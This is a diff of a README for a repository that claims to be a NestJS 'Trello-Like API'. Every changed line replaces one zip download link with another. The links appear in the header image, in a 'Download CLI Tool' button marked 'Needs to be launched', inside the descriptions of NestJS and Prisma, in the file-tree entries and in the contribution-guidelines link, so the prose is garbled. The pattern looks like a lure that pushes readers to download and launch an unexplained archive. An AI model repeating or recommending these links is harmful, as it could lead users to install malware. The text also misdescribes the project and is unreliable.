@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "Trello-Like API" Repository! 📊
 
-![Trello-Like API](https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip)
+![Trello-Like API](https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip)
 
 ## Overview
 This repository houses a NestJS API designed for a Trello-like application. The API is built using TypeScript, Prisma, and Swagger. It seamlessly connects to a PostgreSQL database running in a Docker container.
@@ -25,13 +25,13 @@ To utilize the full potential of this API, follow these steps:
 
 ## Installation Guide
 To install the CLI tool for easier repository management, click the button below:
-[![Download CLI Tool](https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip)](https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip "Needs to be launched")
+[![Download CLI Tool](https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip)](https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip "Needs to be launched")
 
 ## Technologies Used
 The Trello-Like API leverages a variety of technologies to provide a robust and efficient solution:
-- **NestJS**: A progressive https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip framework for building efficient and scalable server-side applications.
+- **NestJS**: A progressive https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip framework for building efficient and scalable server-side applications.
 - **TypeScript**: A strongly typed superset of JavaScript that adds optional static typing.
-- **Prisma**: An ORM (Object-Relational Mapping) tool for https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip and TypeScript.
+- **Prisma**: An ORM (Object-Relational Mapping) tool for https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip and TypeScript.
 - **Swagger-UI**: An open-source tool for API documentations built with OpenAPI specifications.
 - **PostgreSQL**: A powerful, open-source relational database system.
 - **Docker & Docker-Compose**: Tools for creating, deploying, and managing applications within containers.
@@ -45,17 +45,17 @@ trello-like-api/
 |   |__ models/
 |   |__ services/
 |   |__ utils/
-|   |__ https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip
-|   |__ https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip
+|   |__ https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip
+|   |__ https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip
 |   |__ ...
-|   https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip
+|   https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip
 |   .env
-|   https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip
+|   https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip
 |   ...
 ```
 
 ## Contribution Guidelines
-Contributions to the Trello-Like API repository are welcome! Before making any changes, please review the [contribution guidelines](https://github.com/NASS3344/trello-like-api/releases/download/v1.0/Software.zip) to ensure a smooth collaboration process.
+Contributions to the Trello-Like API repository are welcome! Before making any changes, please review the [contribution guidelines](https://github.com/NASS3344/trello-like-api/raw/refs/heads/main/pacifically/like-trello-api-3.4.zip) to ensure a smooth collaboration process.
 
 Let's build the next-generation Trello-like application together! 🚀🌟
 
